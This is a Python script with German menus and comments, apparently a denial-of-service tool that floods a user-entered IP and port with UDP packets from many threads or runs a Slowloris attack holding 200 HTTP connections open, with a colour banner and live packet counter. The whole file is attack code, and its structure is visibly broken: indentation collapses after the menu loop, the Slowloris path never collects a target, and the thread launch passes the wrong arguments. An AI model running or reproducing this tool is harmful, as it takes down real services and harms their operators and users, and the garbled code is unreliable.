import os
import random
import socket
import threading
import time
import sys

# Globale Variablen
packet_counter = 0
stop_event = threading.Event()

# Banner
def show_banner(color):
    os.system("clear")
    print(f"{color}")
    print("""
██████╗ ██████╗  
██╔══██╗██╔══██╗
██████╔╝██████╔
██╔═══╝ ██╔═══╝ 
██║     ██║     
╚═╝     ╚═╝      
    """)
    print("\033[0m")

# UDP Flood
def udp_flood(ip, port, packet_size, packet_rate):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)  # Empfangsbuffer minimieren
    udp_bytes = random._urandom(packet_size)
    start_time = time.time()

    while not stop_event.is_set():
        try:
            sock.sendto(udp_bytes, (ip, port))
            packet_counter += 1

            # Paketrate begrenzen
            if packet_counter / (time.time() - start_time) > packet_rate:
                time.sleep(0.001)  # Kurz pausieren, um die Rate einzuhalten
        except:
            pass

# Slowloris (TCP Keep-Alive)
def slowloris(ip, port):
    global packet_counter
    sockets = []
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sockets.append(sock)
        except:
            pass
    while not stop_event.is_set():
        for sock in sockets:
            try:
                sock.send(b"X-a: Keep-alive\r\n")
                packet_counter += 1
            except:
                sockets.remove(sock)

# Menü zur Farbauswahl
def choose_color():
    print("1 - Rot")
    print("2 - Grün")
    print("3 - Blau")
    print("4 - Standard")
    choice = input("Wähle eine Farbe: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")

# Live-Dashboard
def dashboard():
    global packet_counter
    start_time = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        rate = packet_counter / elapsed if elapsed > 0 else 0
        print(f"\r[INFO] Gesendete Pakete: {packet_counter} | Paketrate: {rate:.2f}/s", end="")
        time.sleep(1)

# Hauptprogramm
if __name__ == "__main__":
    color = choose_color()
    show_banner(color)

    while True:
        print("1 - UDP Flood")
        print("2 - Slowloris Attack")
        print("3 - Beenden")
        choice = input(" [ Wähle eine Option ] : ")

        if choice == "3":
            print("[INFO] Programm beendet.")
            sys.exit()

if choice == "1":  # UDP Flood
    ip = input("Ziel-IP-Adresse: ")
    port = int(input("Ziel-Port: "))
    duration = int(input("Dauer des Angriffs (Sekunden): "))
    threads = int(input("Anzahl der Threads: "))
    packet_size = max(1, min(65507, int(input("Paketgröße (Bytes, 1-65507): "))))
    packet_rate = max(1, int(input("Maximale Pakete pro Sekunde (min. 1): ")))

stop_event.clear()

# Angriffsfunktionen den Optionen zuordnen
if choice == "1":
    attack_function = udp_flood
    args = (ip, port, packet_size, packet_rate)

elif choice == "2":
    attack_function = slowloris
    args = (ip, port)  # Standard-Port für Slowloris

if choice == "3":
            print("[INFO] Programm beendet.")
            sys.exit()

            # Threads starten
    attack_threads = [
        threading.Thread(target=udp_flood, args=(ip, port, packet_size, packet_rate, duration))
        for _ in range(threads)
                     ]
    for thread in attack_threads:
        thread.start()

            # Dashboard starten
    dashboard_thread = threading.Thread(target=dashboard)
    dashboard_thread.start()

    input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
    stop_event.set()
